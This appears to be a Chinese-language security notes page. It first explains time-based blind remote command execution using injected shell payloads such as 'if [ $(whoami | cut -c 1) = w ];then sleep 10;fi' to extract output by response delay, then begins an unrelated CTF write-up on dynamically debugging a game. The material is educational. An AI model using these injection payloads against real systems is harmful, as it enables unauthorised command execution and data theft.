### Time\_Based\_RCE

类似于SQL注入的时间盲注，命令执行成功则延时几秒。

空格一定不要少

```
cmd=if [ 1 = 1 ];then sleep 10;fi#延时10s

```

![](../Images/7270568c3d81a2138613a41752945abf.png)

```
cmd=if [ 2 = 1 ];then sleep 10;fi#秒响应

```

![](../Images/2a81b1c0c7f996a5737e41bbf2fd1f11.png)

那么我们可以利用这种类似sql盲注的方法进行RCE执行结果获取

cmd=if \[ $(whoami | cut -c 1) = w \];then sleep 10;fi

如果成立，则会类似盲注一样，待响应10s，我们就可以通过这种方式进行数据获取

![](../Images/22f266239d5017a0978d31a8b12edd13.png)

如果其中含有特殊字符，我们可以经过base32处理一下

cmd = if \[ $(whoami | base32 | cut -c 1) = N \];then sleep 10;fi

直接执行

cmd = if \[ $(whoami) = www-data \];then sleep 10;fi

## **2020级 大能猫** | 记一次令人崩溃的动调初探

### 记一次令人崩溃的动调初探

#### 前言

一直不太会动调，寻思着整个游戏题练练动调。这次经历还是耐人寻味的，尝试了无数遍吧，最后才调好了。

#### 分析

题目很简单，就是个游戏，打通了就给flag，如果单纯的打游戏的话我花了大概5分钟的时间通关了，但是还没来得及截图，画面就没了，可以说是一闪而过。没有走马观碑的本事，那就去老老实实动调去。

![](../Images/8ecea8c5146eb9b0b344acc8a3dd935b.png)

就是一个遇到s就按空格，遇到x就按x，遇到m就按m的游戏，考验反应能力emmmmmm，，，

话不多说我们的思路就是通过动调来使游戏通过关，从而拿到flag。

#### 动调

![](../Images/d2f4e758f3b1769b60f4ca62c449635b.png)

载入之后我们啥也看不懂emmmmmm，，，就先f8跟着走一下

运行到00551ede位置的时候我们就看到程序已经开始运行起来，报错了之后才去执行下一条指令，那我们就记下这个位置，shift+f7跟进去看一下。

我们就继续重新载入，在这个地方shift+f7跟进去看看

![](../Images/6b36fab94eb9018f8cd90cc9da66f8eb.png)
